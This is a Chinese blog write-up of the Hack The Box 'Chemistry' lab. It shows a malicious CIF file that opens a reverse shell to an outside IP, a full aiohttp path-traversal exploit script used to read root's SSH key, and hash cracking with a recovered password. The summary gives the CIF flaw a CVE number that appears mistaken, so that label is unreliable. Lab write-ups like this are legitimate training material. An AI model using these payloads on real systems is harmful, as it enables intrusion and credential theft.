#  HTB-Chemistry靶机渗透，CVE-2024-23334系统目录遍历，导致权限提升   
原创 仙草里没有草噜丶  泷羽Sec   2024-11-25 11:58  
  
##### ~ 两个人挺好，一个人也不错。 ~  
  
  
[Goby2024红队版工具分享，附2024年漏洞POC下载](http://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247495953&idx=1&sn=ea2dfd3fc4c7933ad3e1aa98c2c541e9&chksm=ceb16a1cf9c6e30a4d7ef3f758f9e5e5acd6e33f020d90c900fd3ce21e34e81de6b0f26b2e3b&scene=21#wechat_redirect)  
  
  
[谁的能拒绝这样一款终端呢？](http://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247495843&idx=1&sn=4a73d8acc9ecc0c696c18cb2cce706fa&chksm=ceb16baef9c6e2b897aae723768696f5bca42eb9d59525f060954e903ca879eff7b5da213bef&scene=21#wechat_redirect)  
  
### 靶机  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwyuQAauOiaqUbvx0MYxasuX3gtV5sqPry4BlPD8WhESticiaI4D0wEKKOQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241125150033245  
### 靶机渗透  
  
首页  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwVJQubcJcoQf79WzjLvldZyUyNmVPpP2bciaesWL3nPqm3TosOdYR21w/640?wx_fmt=png&from=appmsg "")  
  
image-20241123124934063  
  
我们去注册一个用户看看  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwpSxibU6IchvibgTlMhLrFibokWEgvuXLN9KueNc5lVdrAYs71v2URnrQA/640?wx_fmt=png&from=appmsg "")  
  
image-20241123145738475  
  
注册admin用户的时候，提示了一句该用户已存在  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwqjNoO5lUpCZxTSNW8qiaqdcogW4wCTN5jXYpToD9zt89Bv6jiawN0uKA/640?wx_fmt=png&from=appmsg "")  
  
image-20241123145747496  
  
那么直接sql注入字典爆破，测试有没有sql注入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwOh21tHL5LicdsjSvZrvEe4WMll86ic2BDjRjWBddYLz1CXicQeCluXYEQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241123144918314  
  
清一色的1316  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwVbWGSAIjgep4miak1YicEXQoNXMzWJ865TPCrCfiatr1JhyFtJL1Hotwg/640?wx_fmt=png&from=appmsg "")  
  
image-20241123145038357  
  
cookie伪造  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwvHFQQkcgeWPsFx8LpKovWFvxK4ibqr0UnQUqdCfiaA76LAGkFVslLPWg/640?wx_fmt=png&from=appmsg "")  
  
image-20241123145441075  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kw0u1pCiaQBGbocZIicAYsUEuXG4icjtZfk4TeL0OyEmJ7wFZZKjjdZRogA/640?wx_fmt=png&from=appmsg "")  
  
image-20241123145524206  
  
也不行，我们注册一个普通用户进去，发现一个文件上传点  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwIE90wS7bF9qnG73FE0yricSnVzvGqsezTw22bCAxarDpGL6kcZzX6Yw/640?wx_fmt=png&from=appmsg "")  
  
image-20241123150026249  
  
查看到是flask项目  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwAiaVC1BOZKWhh7nrBzAh0VAss38kSicLG9YgrZSNeGicNOb7tCxfoE26A/640?wx_fmt=png&from=appmsg "")  
  
image-20241123150350825  
  
上传任意文件，这个文件上传的方法不管用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwzfOGCJAiaGzxhHeCvhw56QZiae6aNic8RRibRswwuILBpq7vCogEBVfT2w/640?wx_fmt=png&from=appmsg "")  
  
image-20241123150532947  
  
来到刚进来的首页，看提示说能上传CIF晶体信息文件  
> 白小羽  
> 晶体学信息文件(Crystallographic Information File, CIF)是以“.cif”结尾的计算机文件，它包含了晶体的晶胞参数、原子坐标、文献资料等信息。各种晶体、材料计算处理软件，如Vesta，Diamond，GSAS，Mercury，Rasmal，Materials Studio等都以晶体信息文件作为输入或者输出结果。  
  
  
CIF详细（看不懂）：  
```
https://blog.csdn.net/Ai_yunyun/article/details/132496026

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kw9loeeibHMbqvZn1bqYbB28qrxGChydKWpg9heRPjibYV3zds3ckGuibgA/640?wx_fmt=png&from=appmsg "")  
  
image-20241123150621451  
  
找到一个RCE文件，这里使用的是英文，用中文的话搜不到什么东西  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwtXdHKMqcmN6SRub8eFKiakmFy4ZdcMtqXggHNw8ibdMZia0SY1IibYDqAw/640?wx_fmt=png&from=appmsg "")  
  
image-20241123151343627  
  
翻译软件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwXibanI6KgAlcmWRoABUlibBsWMdxBNvdHAD3x8K1g0ZibnxdiaicRSCOx5Q/640?wx_fmt=png&from=appmsg "")  
  
image-20241123151714108  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwu5IO4At5gxLyLicVnbQe14KAOiazcSEuclvpiacU1IviaYec7dZA4O1hkg/640?wx_fmt=png&from=appmsg "")  
  
image-20241123152028995  
  
修改POC  
```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'/bin/bash -i >& /dev/tcp/10.10.16.47/1450 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwHq5STqQicMVwaCsnxxrgNIOt00TMKsWpvbQZ3ZAOVWwtZWzGicVglo7Q/640?wx_fmt=png&from=appmsg "")  
  
image-20241123155515939  
  
成功上线  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwuFqSJib3Xn3CLRmwgwvDndU8A8e3tumiaTV8TJKVFWNV53cBnKhqHUvA/640?wx_fmt=png&from=appmsg "")  
  
image-20241123155531525  
  
创建一个交互式终端  
```
python3 -c "import pty; pty.spawn('/bin/bash')"

```  
  
查找SUID文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwKPsExTzncVZoK4GNuLVLCQTtiaP4ficY9ibMrGkoVWcib7tErLsGdS97xA/640?wx_fmt=png&from=appmsg "")  
  
image-20241123182403800  
  
查看操作系统信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwIImRxS4XApNyEwPl4SicJewx4mp3KJLib75Tbico45ib0vBRybI8Vz9F3Q/640?wx_fmt=png&from=appmsg "")  
  
image-20241123181523398  
  
查看版本信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwbicB1MpXqF83xsO2907K7CwZ251nb7okB3wmKLwRyPAlz7Jnjc5U4rg/640?wx_fmt=png&from=appmsg "")  
  
image-20241123181508838  
  
查看/etc/passwd  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwldFrwWxJjrPkZOkdiaV6efKsty08BBEAKTibln0YbJTcmAticiat3y37Dg/640?wx_fmt=png&from=appmsg "")  
  
image-20241123183640713  
  
查找根目录的隐藏文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kw5YNNjddxJNJiamvEicJlQ73DcF8McRBIBSmk5FTTPXpAfDejBNlgZlBg/640?wx_fmt=png&from=appmsg "")  
  
image-20241123185910243  
  
查找数据库中的表，sql语句中的from要区分好，不是form  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwmdgibeuawEhmOGibb1U8x3iblyDgtibsOaKSXyV3O8Jaq0XaicxqicAVTk6A/640?wx_fmt=png&from=appmsg "")  
  
image-20241123184816706  
  
有三个可能的用户，记住这三个hash，待会要用到  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwkoHr1gncgZevNyLclbhshibSuYksrfnGPDBeloDpZkMht7OJOLckpWw/640?wx_fmt=png&from=appmsg "")  
  
image-20241123192646309  
  
识别admin的hash密码，貌似是个md5加密  
> 白小羽  
> hash-identifier ：一款哈希算法识别工具，它能够帮助用户识别给定哈希值所使用的哈希算法。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwVpUjcWibfzqMATCqPyqtGmibLUGr4QXOSzxNrarBiaBYAhUehIWVu0G3A/640?wx_fmt=png&from=appmsg "")  
  
image-20241123200242781  
  
使用密码hash破解工具，john，失败了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwlTicdtamaWnfxD2skLX8T0q5zD03K62cY5ymzoZolsSDP5Fnziaibdb8A/640?wx_fmt=png&from=appmsg "")  
  
image-20241123214111043  
  
这里我们使用hashcat工具，进行密码碰撞  
```
hashcat -m 0 2861debaf8d99436a10ed6f75a252abf /usr/share/wordlists/rockyou.txt # Approaching final keyspace - workload adjusted.

hashcat -m 0 197865e46b878d9e74a0346b6d59886a /usr/share/wordlists/rockyou.txt # Approaching final keyspace - workload adjusted.

hashcat -m 0 63ed86ee9f624c7b14f1d4f43dc251a5 /usr/share/wordlists/rockyou.txt # unicorniosrosados

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwibvDXz6kwa5faMCyzwflwibphibCdmIeDYEAWdAH2DNd30XlYtklHO6eA/640?wx_fmt=png&from=appmsg "")  
  
image-20241123215006375  
  
有了第三个用户的密码可以猜测刚刚的22端口，进行ssh连接，登录成功（如果不能连的话直接在反弹的shell直接su切换用户）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwuDTek2icp4ficxmhN2bQFJR4yH84mkTvSeKZT0BG8IPm8xmnXkt6nClg/640?wx_fmt=png&from=appmsg "")  
  
image-20241123221424468  
  
找到第一个flag  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwxNqbYzcwgKd8Tvohnoq2bTWc4m1dL0f7ia70IVc1Upr3fDOx4ExmHAA/640?wx_fmt=png&from=appmsg "")  
  
image-20241123231732052  
  
检查sudo是否可以使用，列出所有可以用sudo执行的文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwicpicOhTvjGicEXjP6umYuUx51apvrw9Eia3xibCUBl4HAouibGLHO46Ke0w/640?wx_fmt=png&from=appmsg "")  
  
image-20241123232056711  
  
查看用户进程信息  
```
ps -aux | grep root

```  
  
看到了一个正在执行的py文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwmWYlHMMf1uO1JCpBFaQQTauPtaBRgHHKoF2YwgABZ9cvSRhAf67Bxw/640?wx_fmt=png&from=appmsg "")  
  
image-20241125134035157  
  
尝试访问，提示权限不足  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwHzIDPwhnktnnUFRpTShb7oPGleWmlmOPPVQ0dwqKT5eSlqNaxMoLKQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241125134312151  
  
查看靶机网络连接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwNsc1e5b0ghl7X0ckDXWPORUKyVfvMWRVSX7ONljb2GibgDFro78XSoQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241125134404083  
  
使用curl查看响应  
```
curl -I 127.0.0.1:8080

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwIvSrbVGPkmgbp1SLjWicvia4iamjsib07pwqzDYsicaU5TNcfSbsbFd567g/640?wx_fmt=png&from=appmsg "")  
  
image-20241125135437386  
  
可以看到 aiohttp 3.9.1版本的漏洞信息，CVE-2024-23334  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwaxic6oDUYCYE7RODrPB6TMCafiaicHqedeekfxo2so3YXOpZtuSeAxRxQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241125135701183  
  
下载poc，查看其代码  
```
import argparse
import http.client
import textwrap
import urllib
 
 
def exploit(url, file, dir):
    parsed_url = urllib.parse.urlparse(url)
    conn = http.client.HTTPConnection(parsed_url.netloc)
 
    traversal  = "/.."
    payload = dir
    for i in range(15):
        payload += traversal
 
        print(f'''[+] Attempt {i}                    Payload: {payload}{file}        ''')
 
        conn.request("GET", f"{parsed_url.path}{payload}{file}")
        res = conn.getresponse()
        result = res.read()
        print(f"                    Status code: {res.status}")
 
        if res.status == 200:
            print("Respose: ")
            print(result.decode())
            break
 
 
 
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="PoC for CVE-2024-23334. LFI/Path-Traversal Vulnerability in Aiohttp",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(''' Usage:            exploit.py -u http://127.0.0.1 -f /etc/passwd -d /static        ''')
    )
 
    parser.add_argument('-u', '--url', help="Aiohttp site url")
    parser.add_argument('-f', '--file', help="File to read")
    parser.add_argument('-d', '--directory', help="Directory with static files. Default: /static", default="/static")
 
    args = parser.parse_args()
    if args.url and args.file and args.directory:
        exploit(args.url, args.file, args.directory)
        print("Exploit complete")
    else:
        print("Error: One of the parameters is missing")

```  
  
通过curl可以看到源码，并且文件的静态目录在/assets下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwns1Tn23RpicIp2nMNkrvANSBcdfbjqemGLNbvwCJ4I3ibg3V29ubof9Q/640?wx_fmt=png&from=appmsg "")  
  
image-20241125142156137  
  
查看使用方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwfX7V8yPOI8pX4cGmAeYPibxlqBkQftDicEdXsnoPbRmPbiaLPiaVUKWATg/640?wx_fmt=png&from=appmsg "")  
  
image-20241125142653846  
  
执行读取/etc/passwd测试  
```
python3 exp.py -u http://127.0.0.1:8080 -f /etc/passwd -d /assets

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwzRPnPLCtibhX8OLC0d0mnibCrO8NddjK1cfqgia0ffCSYz6VNRK9WKsYg/640?wx_fmt=png&from=appmsg "")  
  
image-20241125143425366  
  
读取 ssh 密匙，指定刚刚的静态目录  
```
python3 exp.py -u http://127.0.0.1:8080 -f /root/.ssh/id_rsa -d /assets

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwGk8BoQ5CCromibO8ZryLb6eyfaXyX8wZibbxoVwtGZTzFmd5MVuEHZmg/640?wx_fmt=png&from=appmsg "")  
  
image-20241125145106834  
```
chmod 000 key
ssh root@10.10.11.38 -i key

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kw9MaMrWK8O3h4KvC6ozkOl6BPd8pgokjGibibKdJWMqolibDyZHnhlibtKQ/640?wx_fmt=png&from=appmsg "")  
  
image-20241125144926294  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHsZic2Aj95wdFlRQibHp45kwN9GMPOSI0eQGXZAocM3ibNXr9EgN3pLWUk76vFXkOC31PugiawqvJh4A/640?wx_fmt=png&from=appmsg "")  
  
image-20241125145941955  
### 总结  
  
本文主要用到的漏洞信息为  
  
CVE-2024-9264 的RCE漏洞，在CIF文件解析的时候会被执行恶意代码，从而获取webshell  
  
CVE-2024-23334 aiohttp 3.9.1 的目录遍历漏洞导致系统中的ssh密匙被读取，从而由普通用户的权限，上升到root权限，要么禁用密匙登录，就可以防范  
  
用到的命令：  
```
curl -I 127.0.0.1:8080 # 使用curl发送get请求，返回响应信息
ps -aux | grep root # 列出所有root用户的进程信息
hashcat -m 0 63ed86ee9f624c7b14f1d4f43dc251a5 /usr/share/wordlists/rockyou.txt # 使用hashcat 进行密码哈希破解，并指定字典目录
hash-identifier 63ed86ee9f624c7b14f1d4f43dc251a5 # 识别hash是由什么算法进行加密的
python -c "import pty; pty.spawn('/bin/bash')" # 创建一个交互式终端

```  
#### 往期推荐  
  
[【渗透测试】DC1~9(全) Linux提权靶机渗透教程，干货w字解析，建议收藏](http://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247495774&idx=1&sn=ad20212bd08f94652d40e286406ed40f&chksm=ceb16b53f9c6e2459fc4d2ecbb549c2f21ff90c673e41809eeea0c3cd7728dd658d6a8ddd2cb&scene=21#wechat_redirect)  
  
  
[放开双手 ！SQL注入Fuzzing字典 （270个）](http://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247493424&idx=1&sn=d6fb15d65b779fd5e9251e632afff375&chksm=ceb17c3df9c6f52b3fc89eecb2ea1b6cda5f4507aaffdf0ef8dae440a4fe29a1647cd90d1cc2&scene=21#wechat_redirect)  
  
  
[24年6月版本AWVS激活，AWVS漏洞扫描工具安装以及基本使用教程](http://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247493143&idx=1&sn=451a5ee39bbf8109362bbbc5c540f4cc&chksm=ceb17d1af9c6f40cfe0ff9d94ed1c3cd085af8368cd9a35b811638322a31ccb91ff9c397caff&scene=21#wechat_redirect)  
  
  
[开箱即用！265种windows渗透工具合集--灵兔宝盒](http://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247492994&idx=1&sn=ca2ba6fe86b4172e3e6d3cbb3791c05f&chksm=ceb17e8ff9c6f7993d49ebab74c400cff9ffb9e2010a8af69ff4197b5a289af53a595e03e5a2&scene=21#wechat_redirect)  
  
  
[比kali更稳定，工具更多，更加适合开发的操作系统-Blackarch](http://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247492819&idx=1&sn=ab64bf8967e36a83cd70bd8a1041d1df&chksm=ceb17fdef9c6f6c8df10bf0538f93c4efaa31cd1529e46d0e846437515060d70302376c55b8c&scene=21#wechat_redirect)  
  
  
  
